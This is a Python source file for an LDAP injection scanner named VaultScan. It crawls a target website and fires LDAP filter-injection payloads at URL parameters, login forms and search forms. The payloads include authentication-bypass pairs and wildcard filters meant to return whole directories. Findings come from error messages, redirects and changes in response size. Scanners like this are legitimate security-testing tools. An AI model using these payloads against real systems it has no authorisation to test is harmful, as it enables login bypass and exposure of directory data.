#!/usr/bin/env python3
"""
VaultScan -- LDAP Injection Scanner
=====================================
Tests for LDAP injection vulnerabilities in login forms,
search parameters, and common LDAP-related URL patterns.
"""

import os
import re
import sys
from typing import Dict, List
from urllib.parse import urlparse, urljoin, urlencode

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scan_utils import (
    is_mock_mode,
    output_findings,
    base_argparser,
    normalize_url,
    create_session,
    safe_request,
    make_finding,
    crawl_same_domain,
    extract_forms,
    extract_url_params,
)

# ---------------------------------------------------------------------------
# LDAP injection payloads
# ---------------------------------------------------------------------------
LDAP_PAYLOADS = [
    "*)(&",
    "*)(|(&",
    "*()|&",
    "admin)(&)",
    "admin)(|(password=*",
    ")(cn=*))(|(cn=*",
    "*))(objectClass=*",
    "*)(uid=*))(|(uid=*",
    "\\00",
    "*()|%26",
    "*)%00",
]

AUTH_BYPASS_PAYLOADS = [
    ("admin)(&)", "anything"),
    ("admin)(|(password=*", "anything"),
    ("*)(uid=*))(|(uid=*", "anything"),
    ("*)(&", "*)(&"),
    ("*", "*"),
]

LDAP_ERROR_PATTERNS = [
    re.compile(r"LDAP", re.IGNORECASE),
    re.compile(r"javax\.naming", re.IGNORECASE),
    re.compile(r"Invalid DN", re.IGNORECASE),
    re.compile(r"search filter", re.IGNORECASE),
    re.compile(r"LdapErr", re.IGNORECASE),
    re.compile(r"NamingException", re.IGNORECASE),
    re.compile(r"ldap_search", re.IGNORECASE),
    re.compile(r"bad search filter", re.IGNORECASE),
    re.compile(r"LDAP filter error", re.IGNORECASE),
    re.compile(r"LDAP query", re.IGNORECASE),
    re.compile(r"supplied argument is not.*ldap", re.IGNORECASE),
    re.compile(r"ldap_bind", re.IGNORECASE),
]

LDAP_URL_PATTERNS = [
    "/ldap", "/login", "/signin", "/sign-in", "/auth",
    "/authenticate", "/search", "/lookup", "/directory",
    "/people", "/users/search", "/contacts", "/addressbook",
    "/admin/login", "/staff", "/employee",
]


def _detect_ldap_errors(text: str) -> str | None:
    """Check response text for LDAP-related error messages."""
    for pattern in LDAP_ERROR_PATTERNS:
        match = pattern.search(text)
        if match:
            # Extract surrounding context (up to 120 chars)
            start = max(0, match.start() - 40)
            end = min(len(text), match.end() + 80)
            return text[start:end].strip()
    return None


def _is_login_form(form: Dict) -> bool:
    """Heuristic: does this form look like a login form?"""
    inputs = form.get("inputs", [])
    has_password = False
    has_text = False
    for inp in inputs:
        itype = (inp.get("type") or "text").lower()
        iname = (inp.get("name") or "").lower()
        if itype == "password" or "pass" in iname:
            has_password = True
        if itype in ("text", "email") or iname in ("username", "user", "email", "uid", "login", "cn"):
            has_text = True
    return has_password and has_text


def _is_search_form(form: Dict) -> bool:
    """Heuristic: does this form look like a search form?"""
    action = (form.get("action") or "").lower()
    if "search" in action or "lookup" in action or "find" in action or "directory" in action:
        return True
    inputs = form.get("inputs", [])
    for inp in inputs:
        iname = (inp.get("name") or "").lower()
        if iname in ("q", "query", "search", "term", "keyword", "name", "cn", "uid", "filter"):
            return True
    return False


def _get_username_field(form: Dict) -> str | None:
    """Return the name of the probable username input field."""
    for inp in form.get("inputs", []):
        itype = (inp.get("type") or "text").lower()
        iname = (inp.get("name") or "").lower()
        if itype in ("text", "email") or iname in ("username", "user", "email", "uid", "login", "cn"):
            return inp.get("name")
    return None


def _get_password_field(form: Dict) -> str | None:
    """Return the name of the probable password input field."""
    for inp in form.get("inputs", []):
        itype = (inp.get("type") or "text").lower()
        iname = (inp.get("name") or "").lower()
        if itype == "password" or "pass" in iname:
            return inp.get("name")
    return None


def _get_search_field(form: Dict) -> str | None:
    """Return the name of the probable search input field."""
    for inp in form.get("inputs", []):
        iname = (inp.get("name") or "").lower()
        if iname in ("q", "query", "search", "term", "keyword", "name", "cn", "uid", "filter"):
            return inp.get("name")
    # Fallback: first text input
    for inp in form.get("inputs", []):
        itype = (inp.get("type") or "text").lower()
        if itype in ("text", "search") and inp.get("name"):
            return inp.get("name")
    return None


# ---------------------------------------------------------------------------
# Test functions
# ---------------------------------------------------------------------------

def test_ldap_in_url_params(session, url: str, timeout: int) -> List[Dict]:
    """Test LDAP injection via URL query parameters."""
    findings = []
    params = extract_url_params(url)
    if not params:
        return findings

    # Baseline
    baseline_resp, err = safe_request(session, "GET", url, timeout=timeout)
    if err or not baseline_resp:
        return findings
    baseline_text = baseline_resp.text
    baseline_len = len(baseline_text)

    for param_name in params:
        for payload in LDAP_PAYLOADS:
            test_params = dict(params)
            test_params[param_name] = payload

            parsed = urlparse(url)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

            resp, err = safe_request(session, "GET", test_url, timeout=timeout)
            if err or not resp:
                continue

            # Check for LDAP error messages
            error_ctx = _detect_ldap_errors(resp.text)
            if error_ctx:
                findings.append(make_finding(
                    vulnerability="LDAP Injection via URL Parameter",
                    severity="HIGH",
                    location=url,
                    evidence=(
                        f"Parameter '{param_name}' with payload '{payload}' triggered "
                        f"LDAP error: ...{error_ctx}..."
                    ),
                    category="LDAP_INJECTION",
                    raw_details={
                        "parameter": param_name,
                        "payload": payload,
                        "error_context": error_ctx,
                        "test_url": test_url,
                    },
                ))
                break  # One payload per param is enough

            # Check for significant response difference (possible successful injection)
            resp_len = len(resp.text)
            if resp.status_code == 200 and baseline_resp.status_code == 200:
                diff_ratio = abs(resp_len - baseline_len) / max(baseline_len, 1)
                if diff_ratio > 0.5 and resp_len > baseline_len:
                    findings.append(make_finding(
                        vulnerability="Potential LDAP Injection - Response Anomaly",
                        severity="MEDIUM",
                        location=url,
                        evidence=(
                            f"Parameter '{param_name}' with LDAP payload '{payload}' caused "
                            f"significant response size change: {baseline_len} -> {resp_len} bytes "
                            f"(+{diff_ratio:.0%}). This may indicate successful filter manipulation."
                        ),
                        category="LDAP_INJECTION",
                        raw_details={
                            "parameter": param_name,
                            "payload": payload,
                            "baseline_length": baseline_len,
                            "response_length": resp_len,
                        },
                    ))
                    break

    return findings


def test_ldap_auth_bypass(session, form: Dict, timeout: int) -> List[Dict]:
    """Test LDAP injection for authentication bypass on login forms."""
    findings = []

    username_field = _get_username_field(form)
    password_field = _get_password_field(form)
    if not username_field or not password_field:
        return findings

    action = form["action"]
    method = form["method"].upper()

    # Get baseline with clearly invalid credentials
    baseline_data = {}
    for inp in form.get("inputs", []):
        name = inp.get("name")
        if name:
            baseline_data[name] = inp.get("value", "")
    baseline_data[username_field] = "invalid_user_vaultscan_test"
    baseline_data[password_field] = "invalid_pass_vaultscan_test"

    if method == "POST":
        baseline_resp, err = safe_request(session, "POST", action, timeout=timeout, data=baseline_data)
    else:
        baseline_resp, err = safe_request(session, "GET", action, timeout=timeout, params=baseline_data)
    if err or not baseline_resp:
        return findings

    baseline_status = baseline_resp.status_code
    baseline_len = len(baseline_resp.text)

    # Test auth bypass payloads
    for user_payload, pass_payload in AUTH_BYPASS_PAYLOADS:
        test_data = dict(baseline_data)
        test_data[username_field] = user_payload
        test_data[password_field] = pass_payload

        if method == "POST":
            resp, err = safe_request(session, "POST", action, timeout=timeout, data=test_data)
        else:
            resp, err = safe_request(session, "GET", action, timeout=timeout, params=test_data)
        if err or not resp:
            continue

        # Check for LDAP errors
        error_ctx = _detect_ldap_errors(resp.text)
        if error_ctx:
            findings.append(make_finding(
                vulnerability="LDAP Injection in Login Form",
                severity="HIGH",
                location=action,
                evidence=(
                    f"Login form at '{action}' with username payload '{user_payload}' "
                    f"triggered LDAP error: ...{error_ctx}..."
                ),
                category="LDAP_INJECTION",
                raw_details={
                    "form_action": action,
                    "username_field": username_field,
                    "payload": user_payload,
                    "error_context": error_ctx,
                },
            ))
            return findings  # One finding per form

        # Check for auth bypass: redirect to dashboard or significant response change
        if resp.status_code in (301, 302, 303, 307, 308):
            redirect_to = (resp.headers.get("Location") or "").lower()
            if any(kw in redirect_to for kw in ("dashboard", "home", "profile", "admin", "welcome", "account")):
                findings.append(make_finding(
                    vulnerability="LDAP Authentication Bypass",
                    severity="CRITICAL",
                    location=action,
                    evidence=(
                        f"Login form at '{action}' may be vulnerable to LDAP auth bypass. "
                        f"Payload '{user_payload}' in username field caused redirect to "
                        f"'{redirect_to}' (possible authenticated page)."
                    ),
                    category="LDAP_INJECTION",
                    raw_details={
                        "form_action": action,
                        "username_field": username_field,
                        "payload": user_payload,
                        "redirect_location": redirect_to,
                    },
                ))
                return findings

        # Significant difference from failed-login baseline
        resp_len = len(resp.text)
        diff = abs(resp_len - baseline_len)
        if diff > 200 and resp.status_code != baseline_status:
            findings.append(make_finding(
                vulnerability="Potential LDAP Injection - Authentication Anomaly",
                severity="HIGH",
                location=action,
                evidence=(
                    f"Login form at '{action}' responds differently to LDAP payload "
                    f"'{user_payload}'. Baseline status={baseline_status} len={baseline_len}, "
                    f"Payload status={resp.status_code} len={resp_len}."
                ),
                category="LDAP_INJECTION",
                raw_details={
                    "form_action": action,
                    "username_field": username_field,
                    "payload": user_payload,
                    "baseline_status": baseline_status,
                    "payload_status": resp.status_code,
                },
            ))
            return findings

    return findings


def test_ldap_search_form(session, form: Dict, timeout: int) -> List[Dict]:
    """Test LDAP injection in search/lookup forms."""
    findings = []

    search_field = _get_search_field(form)
    if not search_field:
        return findings

    action = form["action"]
    method = form["method"].upper()

    # Build form data
    form_data = {}
    for inp in form.get("inputs", []):
        name = inp.get("name")
        if name:
            form_data[name] = inp.get("value", "")
    form_data[search_field] = "test_normal_search"

    # Get baseline
    if method == "POST":
        baseline_resp, err = safe_request(session, "POST", action, timeout=timeout, data=form_data)
    else:
        baseline_resp, err = safe_request(session, "GET", action, timeout=timeout, params=form_data)
    if err or not baseline_resp:
        return findings

    baseline_len = len(baseline_resp.text)

    # Test payloads
    for payload in LDAP_PAYLOADS:
        test_data = dict(form_data)
        test_data[search_field] = payload

        if method == "POST":
            resp, err = safe_request(session, "POST", action, timeout=timeout, data=test_data)
        else:
            resp, err = safe_request(session, "GET", action, timeout=timeout, params=test_data)
        if err or not resp:
            continue

        # LDAP error detection
        error_ctx = _detect_ldap_errors(resp.text)
        if error_ctx:
            findings.append(make_finding(
                vulnerability="LDAP Injection in Search Form",
                severity="HIGH",
                location=action,
                evidence=(
                    f"Search field '{search_field}' with payload '{payload}' triggered "
                    f"LDAP error: ...{error_ctx}..."
                ),
                category="LDAP_INJECTION",
                raw_details={
                    "form_action": action,
                    "search_field": search_field,
                    "payload": payload,
                    "error_context": error_ctx,
                },
            ))
            return findings

        # Wildcard injection: *))(objectClass=*  may return all entries
        resp_len = len(resp.text)
        if payload in ("*))(objectClass=*", "*)(uid=*))(|(uid=*"):
            if resp_len > baseline_len * 3 and resp_len > 1000:
                findings.append(make_finding(
                    vulnerability="LDAP Wildcard Injection in Search",
                    severity="HIGH",
                    location=action,
                    evidence=(
                        f"Search field '{search_field}' with wildcard payload '{payload}' "
                        f"returned significantly more data: {baseline_len} -> {resp_len} bytes. "
                        f"This may expose all LDAP directory entries."
                    ),
                    category="LDAP_INJECTION",
                    raw_details={
                        "form_action": action,
                        "search_field": search_field,
                        "payload": payload,
                        "baseline_length": baseline_len,
                        "response_length": resp_len,
                    },
                ))
                return findings

    return findings


def test_ldap_url_patterns(session, target: str, timeout: int) -> List[Dict]:
    """Probe common LDAP-related URL patterns for injection points."""
    findings = []
    tested = set()

    for path in LDAP_URL_PATTERNS:
        url = urljoin(target, path)
        if url in tested:
            continue
        tested.add(url)

        resp, err = safe_request(session, "GET", url, timeout=timeout)
        if err or not resp or resp.status_code not in (200, 301, 302, 303):
            continue

        # Follow redirects for login pages
        final_url = resp.url if hasattr(resp, "url") else url

        # Check for forms on this page
        if resp.status_code == 200:
            forms = extract_forms(final_url, resp.text)
            for form in forms:
                if _is_login_form(form):
                    findings.extend(test_ldap_auth_bypass(session, form, timeout))
                elif _is_search_form(form):
                    findings.extend(test_ldap_search_form(session, form, timeout))

            # Also test with LDAP payloads as query params
            for payload in LDAP_PAYLOADS[:4]:
                test_url = f"{final_url}?q={payload}&search={payload}"
                test_resp, err = safe_request(session, "GET", test_url, timeout=timeout)
                if err or not test_resp:
                    continue
                error_ctx = _detect_ldap_errors(test_resp.text)
                if error_ctx:
                    findings.append(make_finding(
                        vulnerability="LDAP Injection via URL Pattern",
                        severity="HIGH",
                        location=final_url,
                        evidence=(
                            f"LDAP endpoint '{final_url}' with payload '{payload}' "
                            f"triggered error: ...{error_ctx}..."
                        ),
                        category="LDAP_INJECTION",
                        raw_details={
                            "url": final_url,
                            "payload": payload,
                            "error_context": error_ctx,
                        },
                    ))
                    break  # One per URL

    return findings


# ---------------------------------------------------------------------------
# Mock findings
# ---------------------------------------------------------------------------

def get_mock_findings(target: str) -> List[Dict]:
    return [
        make_finding(
            vulnerability="LDAP Injection in Login Form",
            severity="HIGH",
            location=f"{target}/login",
            evidence=(
                "Login form username field with payload 'admin)(&)' triggered "
                "LDAP error: ...javax.naming.NamingException: Invalid search filter..."
            ),
            category="LDAP_INJECTION",
        ),
    ]


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = base_argparser("VaultScan LDAP Injection Scanner")
    args = parser.parse_args()
    target = normalize_url(args.target)

    if not target:
        from scan_utils import output_error
        output_error("No target specified.")

    if is_mock_mode():
        output_findings(get_mock_findings(target))

    session = create_session(timeout=args.timeout, cookies=args.cookies, headers=args.headers)

    # Verify target is reachable
    resp, err = safe_request(session, "GET", target, timeout=args.timeout)
    if err:
        output_findings([])

    findings: List[Dict] = []

    # 1. Test common LDAP-related URL patterns
    findings.extend(test_ldap_url_patterns(session, target, args.timeout))

    # 2. Crawl the site for pages with forms and parameters
    urls = crawl_same_domain(target, session, delay=args.delay, timeout=args.timeout, max_pages=5)

    # 3. Test URL parameters for LDAP injection
    urls_with_params = [u for u in urls if "?" in u]
    for url in urls_with_params[:12]:
        findings.extend(test_ldap_in_url_params(session, url, args.timeout))

    # 4. Test forms (login and search) found during crawl
    for url in urls[:20]:
        page_resp, err = safe_request(session, "GET", url, timeout=args.timeout)
        if err or not page_resp or page_resp.status_code != 200:
            continue
        forms = extract_forms(url, page_resp.text)
        for form in forms:
            if _is_login_form(form):
                findings.extend(test_ldap_auth_bypass(session, form, args.timeout))
            elif _is_search_form(form):
                findings.extend(test_ldap_search_form(session, form, args.timeout))

    output_findings(findings)


if __name__ == "__main__":
    main()
